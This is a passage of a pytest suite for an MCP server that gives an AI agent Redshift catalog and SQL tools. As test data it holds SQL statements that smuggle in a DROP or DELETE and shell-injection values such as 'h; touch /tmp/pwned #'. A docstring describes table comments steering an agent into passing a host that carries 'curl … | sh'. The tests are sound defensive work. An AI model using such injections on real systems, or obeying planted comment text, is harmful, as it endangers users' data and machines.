        "SELECT * FROM j ORDER BY a",
    ])
    def test_valid_queries_pass(self, sql):
        validate_read_only_sql(sql)  # should not raise

    @pytest.mark.parametrize("sql,expected_msg", [
        ("", "Empty"),
        ("   \n\t  ", "Empty"),
        ("﻿​   ", "Empty"),
        ("SHOW TABLES", "Only SELECT and WITH"),
        ("EXPLAIN SELECT * FROM t", "Only SELECT and WITH"),
        ("DROP TABLE t", "Only SELECT and WITH"),
        ("SELECT * FROM t; DROP TABLE t", "DROP"),
        ("SELECT 1; DELETE FROM t WHERE 1=1", "DELETE"),
        ("WITH x AS (SELECT 1) SELECT 1; INSERT INTO t VALUES (1)", "INSERT"),
        ("SELECT 1; UPDATE t SET a=1", "UPDATE"),
        ("SELECT 1; ALTER TABLE t ADD COLUMN c int", "ALTER"),
        ("SELECT 1; CREATE TABLE t (a int)", "CREATE"),
        ("SELECT 1; TRUNCATE TABLE t", "TRUNCATE"),
        # 未終結的字串應視為語法錯誤 — 不可被當成繞牆通道
        ("SELECT 'unterminated; DROP TABLE users", "Unterminated string"),
        ("SELECT col /* dangling block comment", "Unterminated block comment"),
        ('SELECT "open identifier', "Unterminated quoted identifier"),
    ])
    def test_invalid_queries_raise(self, sql, expected_msg):
        with pytest.raises(ValueError, match=expected_msg):
            validate_read_only_sql(sql)


# ========== 錯誤處理測試 ==========

class TestErrorHandling:
    """測試錯誤處理"""

    def test_list_tables_invalid_schema(self, mock_config):
        """測試 list_tables 無效 schema 名稱"""
        config, mock_conn = mock_config
        tools = RedshiftTools(lambda: config)

        list_tables = _get_tool_fn(tools, 'list_tables')

        with pytest.raises(ValueError, match="Invalid schema name"):
            list_tables(schema_name='123invalid')

    def test_list_columns_invalid_table(self, mock_config):
        """測試 list_columns 無效 table 名稱"""
        config, mock_conn = mock_config
        tools = RedshiftTools(lambda: config)

        list_columns = _get_tool_fn(tools, 'list_columns')

        with pytest.raises(ValueError, match="Invalid schema or table name"):
            list_columns(schema_name='sales', table_name='invalid-table')

    def test_get_column_comment_invalid_names(self, mock_config):
        """測試 get_column_comment 無效名稱"""
        config, mock_conn = mock_config
        tools = RedshiftTools(lambda: config)

        get_column_comment = _get_tool_fn(tools, 'get_column_comment')

        with pytest.raises(ValueError, match="Invalid schema or table name"):
            get_column_comment(schema_name='valid', table_name='also-invalid', column_name='col')


# ========== Comment cap & scale hint helper tests ==========

class TestCommentCapHelper:
    """apply_comment_cap unit tests"""

    def test_short_comment_untouched(self):
        items = [{"comment": "short"}]
        n = apply_comment_cap(items, "comment", max_len=10)
        assert n == 0
        assert items[0]["comment"] == "short"

    def test_long_comment_truncated_with_ellipsis(self):
        items = [{"comment": "x" * 100}]
        n = apply_comment_cap(items, "comment", max_len=10)
        assert n == 1
        assert items[0]["comment"] == "x" * 10 + "…"

    def test_mixed_items_count_only_truncated(self):
        items = [
            {"comment": "short"},
            {"comment": "x" * 50},
            {"comment": "y" * 5},
        ]
        n = apply_comment_cap(items, "comment", max_len=10)
        assert n == 1
        assert items[0]["comment"] == "short"
        assert items[1]["comment"].endswith("…")
        assert items[2]["comment"] == "y" * 5

    def test_non_string_comment_skipped(self):
        items = [{"comment": None}, {"comment": 123}, {}]
        n = apply_comment_cap(items, "comment", max_len=10)
        assert n == 0  # None / int / missing key all skipped silently

    def test_default_max_len_is_module_constant(self):
        items = [{"comment": "x" * (MAX_COMMENT_LEN + 5)}]
        n = apply_comment_cap(items, "comment")  # no explicit max_len
        assert n == 1
        # cap + 1 because we append the ellipsis after slicing to MAX_COMMENT_LEN
        assert len(items[0]["comment"]) == MAX_COMMENT_LEN + 1


class TestScaleHintHelper:
    """build_scale_hint unit tests"""

    def test_below_threshold_returns_none(self):
        assert build_scale_hint(SCALE_HINT_THRESHOLD) is None
        assert build_scale_hint(SCALE_HINT_THRESHOLD - 1) is None
        assert build_scale_hint(0) is None

    def test_above_threshold_returns_message_with_count(self):
        msg = build_scale_hint(800)
        assert msg is not None
        assert "800" in msg
        # 800 / 50 page_size = 16 paginated calls
        assert "16" in msg
        assert "search_tables" in msg

    def test_just_above_threshold(self):
        msg = build_scale_hint(SCALE_HINT_THRESHOLD + 1)
        assert msg is not None
        # (101 + 49) // 50 = 3 pages
        assert "3" in msg

    def test_custom_page_size(self):
        msg = build_scale_hint(200, page_size=25)
        assert msg is not None
        # 200 / 25 = 8 pages
        assert "8" in msg


class TestListTablesIntegrationWithCapAndHint:
    """End-to-end behavior: list_tables emits scale_hint and truncates comments."""

    @patch('awswrangler.redshift.read_sql_query')
    def test_scale_hint_emitted_when_total_above_threshold(self, mock_read_sql, mock_config):
        config, _ = mock_config
        # Schema lookup (parent comment) + tables list. Many tables (above threshold).
        n_tables = SCALE_HINT_THRESHOLD + 50  # 150 tables
        schema_df = pd.DataFrame({'schema_comment': ['big schema']})
        tables_df = pd.DataFrame({
            'table_name': [f't{i}' for i in range(n_tables)],
            'table_type': ['BASE TABLE'] * n_tables,
        })
        mock_read_sql.side_effect = [schema_df, tables_df]

        tools = RedshiftTools(lambda: config)
        list_tables = _get_tool_fn(tools, 'list_tables')
        result = list_tables(schema_name='big')

        assert result["total_count"] == n_tables
        assert "scale_hint" in result
        assert str(n_tables) in result["scale_hint"]
        assert "search_tables" in result["scale_hint"]

    @patch('awswrangler.redshift.read_sql_query')
    def test_scale_hint_absent_when_total_below_threshold(self, mock_read_sql, mock_config):
        config, _ = mock_config
        schema_df = pd.DataFrame({'schema_comment': ['small schema']})
        tables_df = pd.DataFrame({
            'table_name': ['t1', 't2', 't3'],
            'table_type': ['BASE TABLE'] * 3,
        })
        mock_read_sql.side_effect = [schema_df, tables_df]

        tools = RedshiftTools(lambda: config)
        list_tables = _get_tool_fn(tools, 'list_tables')
        result = list_tables(schema_name='small')

        assert "scale_hint" not in result

    @patch('awswrangler.redshift.read_sql_query')
    def test_table_comment_truncated_when_too_long(self, mock_read_sql, mock_config):
        config, _ = mock_config
        long_comment = "L" * (MAX_COMMENT_LEN + 500)
        schema_df = pd.DataFrame({'schema_comment': ['s']})
        tables_df = pd.DataFrame({
            'table_name': ['big_table'],
            'table_type': ['BASE TABLE'],
            'table_comment': [long_comment],
        })
        mock_read_sql.side_effect = [schema_df, tables_df]

        tools = RedshiftTools(lambda: config)
        list_tables = _get_tool_fn(tools, 'list_tables')
        result = list_tables(schema_name='s', include_comments=True)

        assert result["comment_truncated_count"] == 1
        assert "comment_truncated_hint" in result
        assert result["tables"][0]["comment"].endswith("…")
        assert len(result["tables"][0]["comment"]) == MAX_COMMENT_LEN + 1

    @patch('awswrangler.redshift.read_sql_query')
    def test_short_table_comment_not_flagged(self, mock_read_sql, mock_config):
        config, _ = mock_config
        schema_df = pd.DataFrame({'schema_comment': ['s']})
        tables_df = pd.DataFrame({
            'table_name': ['t'],
            'table_type': ['BASE TABLE'],
            'table_comment': ['short comment'],
        })
        mock_read_sql.side_effect = [schema_df, tables_df]

        tools = RedshiftTools(lambda: config)
        list_tables = _get_tool_fn(tools, 'list_tables')
        result = list_tables(schema_name='s', include_comments=True)

        assert "comment_truncated_count" not in result
        assert "comment_truncated_hint" not in result


class TestSingleGetterDoesNotTruncate:
    """get_table_comment / get_column_comment are the full-text escape hatch."""

    @patch('awswrangler.redshift.read_sql_query')
    def test_get_table_comment_returns_full_long_text(self, mock_read_sql, mock_config):
        config, _ = mock_config
        long_comment = "Z" * (MAX_COMMENT_LEN + 1000)
        mock_df = pd.DataFrame({'table_comment': [long_comment]})
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        get_table_comment = _get_tool_fn(tools, 'get_table_comment')
        result = get_table_comment(schema_name='s', table_name='t')

        # Full text returned, no truncation, no marker
        assert result["comment"] == long_comment
        assert "…" not in result["comment"]

    @patch('awswrangler.redshift.read_sql_query')
    def test_get_column_comment_returns_full_long_text(self, mock_read_sql, mock_config):
        config, _ = mock_config
        long_comment = "C" * (MAX_COMMENT_LEN + 1000)
        mock_df = pd.DataFrame({'data_type': ['varchar'], 'column_comment': [long_comment]})
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        get_column_comment = _get_tool_fn(tools, 'get_column_comment')
        result = get_column_comment(schema_name='s', table_name='t', column_name='c')

        assert result["comment"] == long_comment
        assert "…" not in result["comment"]


# ========== Cross-scope search behavior (schema_name / table_name optional) ==========

class TestSearchToolsCrossScope:
    """search_tables / search_columns now accept None for the narrowing arg
    to enable cluster-wide / schema-wide searches respectively."""

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_tables_cross_schema(self, mock_read_sql, mock_config):
        """search_tables(schema_name=None) should search across all schemas."""
        config, _ = mock_config

        mock_df = pd.DataFrame({
            'schema_name': ['dbt_marts', 'raw_events', 'dbt_staging'],
            'table_name': ['fct_orders', 'orders_raw', 'stg_orders'],
            'table_type': ['BASE TABLE', 'BASE TABLE', 'BASE TABLE'],
            'table_comment': ['Order facts', 'Raw orders', 'Staged orders'],
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        search_tables = _get_tool_fn(tools, 'search_tables')

        # No schema_name argument
        result = search_tables(keywords='order')

        assert result["schema_filter"] is None
        assert result["total_count"] == 3
        # Verify rows from multiple schemas come back together
        schemas_seen = {row["schema_name"] for row in result["tables"]}
        assert schemas_seen == {"dbt_marts", "raw_events", "dbt_staging"}

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_tables_explicit_schema_still_works(self, mock_read_sql, mock_config):
        """Backward compat: passing schema_name still scopes to that schema."""
        config, _ = mock_config

        mock_df = pd.DataFrame({
            'schema_name': ['sales'],
            'table_name': ['orders'],
            'table_type': ['BASE TABLE'],
            'table_comment': ['Orders'],
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        search_tables = _get_tool_fn(tools, 'search_tables')

        result = search_tables(keywords='order', schema_name='sales')

        assert result["schema_filter"] == 'sales'
        assert result["total_count"] == 1

    def test_search_tables_invalid_schema_when_provided(self, mock_config):
        """Invalid schema_name still raises (only the None case is permitted to skip filter)."""
        config, _ = mock_config
        tools = RedshiftTools(lambda: config)
        search_tables = _get_tool_fn(tools, 'search_tables')

        with pytest.raises(ValueError, match="Invalid schema name"):
            search_tables(keywords='order', schema_name='bad-name')

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_columns_schema_wide(self, mock_read_sql, mock_config):
        """search_columns(table_name=None) should search every table in the schema
        and emit table_name on each row."""
        config, _ = mock_config

        # Cross-table hits — multiple tables share the keyword in schema "dbt_marts"
        mock_df = pd.DataFrame({
            'table_name': ['fct_orders', 'fct_returns', 'dim_users'],
            'column_name': ['customer_id', 'customer_id', 'id'],
            'data_type': ['bigint', 'bigint', 'bigint'],
            'is_nullable': ['NO', 'NO', 'NO'],
            'column_comment': [
                'Customer reference (FK to dim_users.id)',
                'Customer who initiated the return',
                'Customer primary key',
            ],
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        search_columns = _get_tool_fn(tools, 'search_columns')

        # Omit table_name: schema-wide search
        result = search_columns(keywords='customer', schema_name='dbt_marts')

        assert result["schema_name"] == 'dbt_marts'
        assert result["table_name"] is None
        assert result["scope"] == 'schema_wide'
        assert result["total_count"] == 3
        # Verify table_name is emitted per row (the natural primitive for cross-table)
        tables_seen = {row["table_name"] for row in result["columns"]}
        assert tables_seen == {"fct_orders", "fct_returns", "dim_users"}

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_columns_single_table_scope_label(self, mock_read_sql, mock_config):
        """Backward compat: passing table_name still works and scope is single_table."""
        config, _ = mock_config

        mock_df = pd.DataFrame({
            'table_name': ['orders'],
            'column_name': ['customer_id'],
            'data_type': ['bigint'],
            'is_nullable': ['NO'],
            'column_comment': ['Customer FK'],
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(lambda: config)
        search_columns = _get_tool_fn(tools, 'search_columns')

        result = search_columns(keywords='customer', schema_name='sales', table_name='orders')

        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert result["scope"] == 'single_table'

    def test_search_columns_invalid_table_when_provided(self, mock_config):
        """Invalid table_name still raises (only the None case skips the filter)."""
        config, _ = mock_config
        tools = RedshiftTools(lambda: config)
        search_columns = _get_tool_fn(tools, 'search_columns')

        with pytest.raises(ValueError, match="Invalid table name"):
            search_columns(keywords='customer', schema_name='sales', table_name='bad-table')

    def test_search_columns_schema_still_required(self, mock_config):
        """schema_name remains required even though table_name is now optional —
        cluster-wide column search would be too expensive on the leader node."""
        config, _ = mock_config
        tools = RedshiftTools(lambda: config)
        search_columns = _get_tool_fn(tools, 'search_columns')

        with pytest.raises(ValueError, match="Invalid schema name"):
            search_columns(keywords='customer', schema_name='bad-schema')


class TestExecuteSqlTransparency:
    """execute_sql echoes the user's SQL plus a user-facing display directive.

    Scope rationale: only execute_sql runs unbounded LLM-generated SQL; the
    metadata tools use fixed catalog templates whose SQL is implementation
    detail, not user-actionable. Forcing display of those would be noise.
    Hence transparency fields live ONLY on execute_sql.
    """

    @patch('awswrangler.redshift.read_sql_query')
    def test_execute_sql_returns_executed_sql_field(self, mock_read_sql, mock_config):
        config, _ = mock_config
        mock_read_sql.return_value = pd.DataFrame({'x': [1]})

        tools = RedshiftTools(lambda: config)
        execute_sql = _get_tool_fn(tools, 'execute_sql')
        result = execute_sql(sql_statement="SELECT 1 AS x")

        assert "_executed_sql" in result
        assert result["_executed_sql"] == ["SELECT 1 AS x"]

    @patch('awswrangler.redshift.read_sql_query')
    def test_execute_sql_returns_user_facing_message(self, mock_read_sql, mock_config):
        """Message must clearly direct the agent to surface the SQL to the user."""
        config, _ = mock_config
        mock_read_sql.return_value = pd.DataFrame({'x': [1]})

        tools = RedshiftTools(lambda: config)
        execute_sql = _get_tool_fn(tools, 'execute_sql')
        result = execute_sql(sql_statement="SELECT 1 AS x")

        assert "_user_facing_message" in result
        msg = result["_user_facing_message"]
        # Must reference the field name (so the agent knows what to display)
        assert "_executed_sql" in msg
        # Must use directive language; "verbatim" / "do not" pin the no-paraphrase
        # contract more than just "show". Either signal is enough.
        msg_lower = msg.lower()
        assert "verbatim" in msg_lower or "do not" in msg_lower

    @patch('awswrangler.redshift.read_sql_query')
    def test_execute_sql_preserves_existing_fields(self, mock_read_sql, mock_config):
        """Adding transparency fields must not displace columns / data / paging info."""
        config, _ = mock_config
        mock_read_sql.return_value = pd.DataFrame({'a': [1, 2], 'b': [3, 4]})

        tools = RedshiftTools(lambda: config)
        execute_sql = _get_tool_fn(tools, 'execute_sql')
        result = execute_sql(sql_statement="SELECT a, b FROM t")

        for key in ("total_count", "returned_count", "offset",
                    "has_more", "columns", "data"):
            assert key in result, f"existing field {key!r} disappeared"
        assert result["columns"] == ["a", "b"]
        assert result["total_count"] == 2

    @patch('awswrangler.redshift.read_sql_query')
    def test_metadata_tools_do_not_carry_transparency_fields(self, mock_read_sql, mock_config):
        """Negative test pinning the scope decision: metadata tools must NOT
        return _executed_sql / _user_facing_message. The catalog SQL is
        implementation detail; surfacing it to users is noise, not signal.
        Pin one tool from each category as a regression guard against scope creep."""
        config, _ = mock_config
        mock_read_sql.return_value = pd.DataFrame({
            'schema_name': ['public'], 'schema_comment': [None],
        })

        tools = RedshiftTools(lambda: config)
        list_schemas = _get_tool_fn(tools, 'list_schemas')
        search_schemas = _get_tool_fn(tools, 'search_schemas')
        get_schema_comment = _get_tool_fn(tools, 'get_schema_comment')

        # list_*
        r = list_schemas(include_comments=True)
        assert "_executed_sql" not in r
        assert "_user_facing_message" not in r

        # search_* (different mock shape)
        mock_read_sql.return_value = pd.DataFrame({
            'schema_name': [], 'schema_comment': [],
        })
        r = search_schemas(keywords="any")
        assert "_executed_sql" not in r
        assert "_user_facing_message" not in r

        # get_*
        mock_read_sql.return_value = pd.DataFrame({'schema_comment': ['c']})
        r = get_schema_comment(schema_name="public")
        assert "_executed_sql" not in r
        assert "_user_facing_message" not in r


# ===== Degraded-mode startup (v0.7.0): no profile yet =====
#
# The server boots regardless of profile state. DB tools return a structured
# not_configured error rather than letting the ConfigurationError crash
# the process. The setup_via_dialog tool can bootstrap a profile in-session
# without the password ever crossing the MCP wire.


class TestDegradedModeContract:
    """v0.7.0: server starts without profile; DB tools return error JSON."""

    def test_db_tool_returns_not_configured_when_provider_raises(self):
        """ConfigurationError from the lazy provider becomes a structured
        tool response, not a propagating exception. This is the core
        degraded-mode behavior — the server never crashes on missing profile."""
        from redshift_comment_mcp.config import ConfigurationError

        def failing_provider():
            raise ConfigurationError(
                "Profile 'default' is not configured. Configure via one of: ..."
            )

        tools = RedshiftTools(failing_provider)
        list_schemas = _get_tool_fn(tools, 'list_schemas')

        result = list_schemas()

        assert result["error"] == "not_configured"
        assert "default" in result["message"]
        assert "setup_via_dialog" in result["next_step"]

    def test_not_configured_response_schema_matches_setup_via_dialog_errors(self):
        """Schema consistency: not_configured response must carry the same
        `exception_class` field as setup_via_dialog's error responses
        (write_profile_failed / keychain_write_failed). Without this, agents
        have to special-case different error-response shapes from related
        tools — schema discipline that round-6 polish brought in."""
        from redshift_comment_mcp.config import ConfigurationError

        def failing_provider():
            raise ConfigurationError("anything")

        tools = RedshiftTools(failing_provider)
        list_schemas = _get_tool_fn(tools, 'list_schemas')
        result = list_schemas()

        # Required fields for the unified error-response schema:
        assert "error" in result
        assert "exception_class" in result, (
            "not_configured response missing exception_class field — "
            "schema diverges from setup_via_dialog's error responses"
        )
        assert result["exception_class"] == "ConfigurationError"
        assert "message" in result
        # not_configured-specific:
        assert "next_step" in result

    def test_every_db_tool_handles_not_configured(self):
        """All 11 DB tools should propagate the not_configured pattern.
        Catches the case where a new tool is added without @_guarded."""
        from redshift_comment_mcp.config import ConfigurationError

        def failing_provider():
            raise ConfigurationError("not configured")

        tools = RedshiftTools(failing_provider)

        # Tools that take no required args, or where we can pass minimal stubs
        cases = [
            ('list_schemas', {}),
            ('list_tables', {'schema_name': 'x'}),
            ('list_columns', {'schema_name': 'x', 'table_name': 'y'}),
            ('search_schemas', {'keywords': 'k'}),
            ('search_tables', {'keywords': 'k', 'schema_name': 'x'}),
            ('search_columns', {'keywords': 'k', 'schema_name': 'x'}),
            ('get_schema_comment', {'schema_name': 'x'}),
            ('get_table_comment', {'schema_name': 'x', 'table_name': 'y'}),
            ('get_column_comment', {'schema_name': 'x', 'table_name': 'y', 'column_name': 'z'}),
            ('get_all_column_comments', {'schema_name': 'x', 'table_name': 'y'}),
            ('execute_sql', {'sql_statement': 'SELECT 1'}),
        ]
        for tool_name, kwargs in cases:
            fn = _get_tool_fn(tools, tool_name)
            result = fn(**kwargs)
            assert isinstance(result, dict), f"{tool_name} returned non-dict: {type(result)}"
            assert result.get("error") == "not_configured", (
                f"{tool_name} did not return not_configured (got: {result})"
            )

    def test_lazy_re_resolution_picks_up_new_config(self, mock_config):
        """Provider is called per tool invocation, so config changes between
        calls take effect without restart. First call: state says
        unconfigured, provider raises, tool returns not_configured. Flip
        state. Second call: provider returns valid config, tool runs.

        State-based provider (vs. list-of-states indexed by call count)
        is robust to tools that access ``self.config`` more than once per
        invocation — the property invocations all see the same external
        state instead of marching off the end of a list."""
        from redshift_comment_mcp.config import ConfigurationError

        config, mock_conn = mock_config
        state = {"configured": False}

        def stateful_provider():
            if state["configured"]:
                return config
            raise ConfigurationError("provider says: not configured yet")

        tools = RedshiftTools(stateful_provider)
        list_schemas = _get_tool_fn(tools, 'list_schemas')

        # 1st call: state is unconfigured → tool returns not_configured
        result1 = list_schemas()
        assert result1.get("error") == "not_configured"

        # Flip external state — simulates setup_via_dialog / CLI setup
        # writing config.toml + keychain in between tool calls.
        state["configured"] = True

        # 2nd call: provider now returns the good config → tool runs.
        # No reset of any indexes, no fragile call-count assertion.
        with patch('awswrangler.redshift.read_sql_query') as mock_read:
            mock_read.return_value = pd.DataFrame({
                'schema_name': ['public'],
                'schema_comment': ['ok'],
            })
            result2 = list_schemas()
        assert result2.get("error") != "not_configured", (
            f"Second call should have picked up the new state via lazy "
            f"resolution, but got: {result2}"
        )
        assert "schemas" in result2 or "items" in result2, (
            f"Second call should return schema data, got keys: "
            f"{list(result2.keys())}"
        )


# ===== setup_via_dialog MCP tool (v0.7.0) =====


class TestSetupViaDialogTool:
    """In-band profile bootstrap via MCP tool. Password collection happens
    via OS-native dialog server-side; never crosses MCP wire."""

    def _make_tools(self, provider=None):
        """Build a RedshiftTools instance with a no-op provider by default
        (setup_via_dialog doesn't need the provider to succeed)."""
        from redshift_comment_mcp.config import ConfigurationError

        if provider is None:
            def provider():
                raise ConfigurationError("not yet")
        return RedshiftTools(provider)

    def test_setup_via_dialog_works_without_configured_profile(self, monkeypatch):
        """setup_via_dialog is the bootstrap tool — it MUST NOT be gated by
        the @_guarded decorator (it has to run before a profile exists)."""
        write_calls = []
        set_pw_calls = []
        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            lambda name, **kw: write_calls.append((name, kw)),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.config.set_password',
            lambda name, pw: set_pw_calls.append((name, pw)),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("dialog-secret", "ok"),
        )
        # Stub the post-write connection test to simulate a reachable cluster
        # — keeps this test hermetic (no real Redshift attempt).
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._test_redshift_connection',
            lambda *args, **kw: (True, None),
        )

        tools = self._make_tools()  # provider raises ConfigurationError
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(
            host='h.example.com',
            user='alice',
            dbname='analytics',
            profile='prod',
            port=5439,
        )

        assert result["status"] == "configured", f"got: {result}"
        assert result["profile"] == "prod"
        assert write_calls == [
            ('prod', {'host': 'h.example.com', 'port': 5439,
                      'user': 'alice', 'dbname': 'analytics'}),
        ]
        assert set_pw_calls == [('prod', 'dialog-secret')]

    def test_setup_via_dialog_dialog_cancelled_status(self, monkeypatch):
        """User clicked Cancel → neither store is touched.

        The password is collected before anything is persisted, so a cancel
        leaves config.toml and the keychain exactly as they were. (Before
        the write-ordering fix, fields were written first and a cancel left
        the new host paired with the old keychain password.)"""
        write_calls = []
        set_pw_calls = []
        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            lambda name, **kw: write_calls.append((name, kw)),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.config.set_password',
            lambda name, pw: set_pw_calls.append((name, pw)),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: (None, "cancelled"),
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(host='h', user='u', dbname='d')

        assert result["status"] == "dialog_cancelled"
        assert len(write_calls) == 0  # fields were NOT written
        assert len(set_pw_calls) == 0  # password was NOT written

    def test_setup_via_dialog_dialog_unavailable_hints_stdin(self, monkeypatch):
        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            lambda name, **kw: None,
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: (None, "unavailable"),
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(host='h', user='u', dbname='d')

        assert result["status"] == "dialog_unavailable"
        assert "--stdin" in result["message"]

    def test_setup_via_dialog_recovery_command_shell_quotes_its_fields(
        self, monkeypatch
    ):
        """The recovery hints print a command line the agent tells the user to
        paste into a terminal, so every interpolated field must be shell-quoted.

        This tool's own threat model is why: the server's charter makes table
        comments authoritative, so comment text is an input channel that can
        influence which `host` an agent passes here. Interpolated raw, a host of
        ``h.example.com; curl … | sh #`` turns the printed line into two
        commands, and one human paste executes the second. Benign values break
        it too — any host / user / dbname / profile containing a space or a
        shell metacharacter silently produces a different command.

        `port` is not quoted: it is typed ``int`` at every call site that builds
        one of these lines, so it cannot carry a metacharacter.
        """
        import shlex

        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            lambda name, **kw: None,
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: (None, "unavailable"),
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        hostile = {
            "host": "h; touch /tmp/pwned #",
            "user": "u; touch /tmp/pwned #",
            "dbname": "d; touch /tmp/pwned #",
            "profile": "p; touch /tmp/pwned #",
        }
        result = setup_via_dialog(port=5439, **hostile)

        assert result["status"] == "dialog_unavailable"
        msg = result["message"]
        for flag, value in (
            ("--host", hostile["host"]),
            ("--user", hostile["user"]),
            ("--dbname", hostile["dbname"]),
            ("--profile", hostile["profile"]),
        ):
            assert f"{flag} {shlex.quote(value)}" in msg, (
                f"`{flag}` must be interpolated through shlex.quote so the "
                f"pasted command line cannot be split into a second command"
            )
            assert f"{flag} {value}" not in msg, (
                f"`{flag}` is interpolated raw: the printed command line runs "
                f"`touch /tmp/pwned` when the user pastes it"
            )

    def test_setup_via_dialog_permission_denied_status_carries_actionable_message(
        self, monkeypatch
    ):
        """macOS Apple-Events permission denial returns a distinct
        `permission_denied` status (NOT dialog_cancelled). The message
        must give the agent actionable user instructions: open System
        Settings → Privacy & Security → Automation, or run tccutil reset.
        Without this distinction the agent would say "you cancelled the
        dialog?" when actually the dialog never appeared."""
        write_calls = []
        set_pw_calls = []
        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            lambda name, **kw: write_calls.append((name, kw)),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.config.set_password',
            lambda name, pw: set_pw_calls.append((name, pw)),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: (None, "permission_denied"),
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(host='h', user='u', dbname='d')

        assert result["status"] == "permission_denied"
        # Nothing persisted (same as cancelled — the password never arrived)
        assert len(write_calls) == 0
        # Password NOT written
        assert len(set_pw_calls) == 0
        # Message must include the macOS-specific recovery path
        msg = result["message"]
        assert "Automation" in msg or "System Events" in msg
        assert "System Settings" in msg or "Privacy" in msg
        # Must NOT mislead agent into treating this as user cancellation
        assert "cancelled" not in msg.lower()
        # Fallback also mentioned for users who can't or won't grant permission
        assert "--stdin" in msg

    def test_setup_via_dialog_missing_field_returns_error(self, monkeypatch):
        """Empty host/user/dbname → reject without touching config or keychain.

        Schema-consistency check: missing_field carries `exception_class`
        like the other `error: ...` responses (ValidationError sentinel,
        no real underlying exception). Agents can pattern-match on a
        single error-response shape across all error paths."""
        write_calls = []
        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            lambda name, **kw: write_calls.append((name, kw)),
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(host='', user='u', dbname='d')

        assert result["error"] == "missing_field"
        # Schema-consistency with not_configured / write_profile_failed /
        # keychain_write_failed:
        assert result["exception_class"] == "ValidationError"
        assert "host" in result["message"]
        assert len(write_calls) == 0  # nothing was written

    # ===== additional coverage rounds (gap-fill) =====

    def test_setup_via_dialog_platform_unsupported_returns_status(self, monkeypatch):
        """Platforms without osascript/zenity wiring (e.g. Windows) get the
        unsupported branch, and nothing is persisted — the message points at
        the CLI pair that writes both stores instead."""
        write_calls = []
        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            lambda name, **kw: write_calls.append((name, kw)),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: (None, "unsupported"),
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(host='h', user='u', dbname='d')

        assert result["status"] == "platform_unsupported"
        assert "platform" in result  # carries the platform name for debugging
        assert "--stdin" in result["message"]
        assert len(write_calls) == 0  # nothing was written — no password arrived

    def test_setup_via_dialog_empty_password_status(self, monkeypatch):
        """Dialog returned (\"\", \"ok\") — weird state where the user clicked
        OK without typing anything. Treat as failure; don't write an empty
        password to keychain."""
        set_pw_calls = []
        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            lambda name, **kw: None,
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.config.set_password',
            lambda name, pw: set_pw_calls.append((name, pw)),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("", "ok"),  # dialog OK but empty
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(host='h', user='u', dbname='d')

        assert result["status"] == "empty_password"
        assert len(set_pw_calls) == 0  # password was NOT written to keychain

    def test_setup_via_dialog_write_profile_failed_returns_error(self, monkeypatch):
        """write_profile raises (e.g. config dir not writable) → tool returns
        write_profile_failed.

        Ordering note: this error is now reached only AFTER the password
        dialog has run. write_profile used to go first, which meant a
        cancelled or unavailable dialog left config.toml pointing at the new
        host while the keychain still held the previous password — a profile
        that reads as `configured` but has never worked. Collecting the
        password first removes that half-written state; the cost is that an
        unwritable config directory is discovered one dialog later, which is
        the cheaper of the two failures. The response shape below is
        unchanged by that move.

        Per CWE-209 (round-5 polish): the raw str(e) MUST NOT appear in
        the response message — the exception class name IS exposed (as
        a separate field, useful for diagnosis), but the message text
        is sanitized."""
        secret_marker = "SUPER_SENSITIVE_PATH_/Users/private/.aws/credentials"
        def failing_write(name, **kw):
            # Simulate an exception whose str() contains sensitive context
            raise PermissionError(secret_marker)
        monkeypatch.setattr('redshift_comment_mcp.config.write_profile', failing_write)
